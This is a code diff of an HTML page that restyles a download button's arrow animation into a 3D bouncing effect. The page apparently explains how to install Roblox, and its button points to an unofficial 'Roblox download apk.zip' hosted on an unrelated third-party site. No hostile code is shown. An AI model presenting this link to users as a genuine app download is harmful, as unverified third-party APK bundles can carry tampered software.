@@ -43,7 +43,7 @@
 
     footer { background:#111; color:#fff; text-align:center; padding:15px 0; font-size:14px; flex-shrink:0; }
 
-    /* ✅ User-Friendly Download Button */
+    /* ✅ 3D Bouncing Download Button */
     .download-btn {
       display: inline-flex;
       align-items: center;
@@ -58,6 +58,7 @@
       box-shadow: 0 8px 20px rgba(0,0,0,0.3);
       transition: all 0.3s ease;
       margin-top: 20px;
+      perspective: 500px;
     }
 
     .download-btn:hover {
@@ -71,13 +72,16 @@
       flex-shrink: 0;
       width: 24px;
       height: 24px;
-      animation: moveArrow 1s infinite;
+      transform-origin: center;
+      animation: bounceArrow 1s infinite;
     }
 
-    @keyframes moveArrow {
-      0% { transform: translateX(0); }
-      50% { transform: translateX(-8px); }
-      100% { transform: translateX(0); }
+    @keyframes bounceArrow {
+      0%   { transform: rotateY(0deg) translateX(0); }
+      25%  { transform: rotateY(15deg) translateX(-4px); }
+      50%  { transform: rotateY(0deg) translateX(-8px); }
+      75%  { transform: rotateY(-15deg) translateX(-4px); }
+      100% { transform: rotateY(0deg) translateX(0); }
     }
   </style>
 </head>
@@ -134,7 +138,7 @@
         <li>Open Roblox and start playing!</li>
       </ol>
 
-      <!-- ✅ Second Button -->
+      <!-- Article Download Button -->
       <a href="https://dooflixtv.net/wp-content/Roblox%20download%20apk.zip" class="download-btn" target="_blank" rel="noopener noreferrer" download>
         <svg class="arrow" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
           <line x1="5" y1="12" x2="19" y2="12"></line>
